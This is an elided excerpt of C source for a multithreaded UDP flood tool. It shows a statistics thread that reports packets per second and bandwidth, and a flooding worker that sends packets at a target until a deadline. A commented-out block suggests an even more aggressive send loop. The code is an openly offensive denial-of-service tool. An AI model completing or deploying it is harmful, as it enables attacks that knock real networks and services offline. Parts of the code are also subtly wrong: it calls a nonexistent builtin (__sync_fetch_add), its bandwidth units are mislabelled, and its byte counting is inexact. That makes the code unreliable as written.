...
void *stats_thread(void *arg) {
    ...
    while (keep_running) {
        ...
        if (interval_seconds > 0) {
            ...
            double mbps = (global_bytes * 8.0) / (interval_seconds * 1024 * 1024);
            
            printf("[STATS] PPS: %.0f | MBps: %.2f | Total: %ld packets | Time: %lds\n", 
                   pps, mbps / 8, current_packets, (current_time - global_start_time));
        }
...
void *udp_flood(void *args) {
    ...
    while (keep_running && time(NULL) < end_time) {
        ...
        if (sent > 0) {
            thread_packets++;
            flood_args->packet_count++;
            flood_args->total_bytes += sent;
            
            // Update global stats every 100 packets to reduce lock contention
            if (thread_packets % 100 == 0) {
                __sync_fetch_add(&global_packets, 100);
                __sync_fetch_add(&global_bytes, sent * 100);
            }
            ...
            if (errno == EAGAIN || errno == EWOULDBLOCK) {
                ...
                if (consecutive_errors > 100) {
                    perror("Persistent send errors");
                    break;
                }
            }
        }
        
        // Aggressive sending - minimal delays
        // Uncomment for even more aggression:
        // while (sendto(sock, buffer, BUFFER_SIZE, MSG_DONTWAIT, 
        //              (struct sockaddr *)&target, target_len) > 0) {
        //     thread_packets++;
        // }
    }

    // Final stats update
    __sync_fetch_add(&global_packets, thread_packets % 100);
    __sync_fetch_add(&global_bytes, (thread_packets % 100) * BUFFER_SIZE);
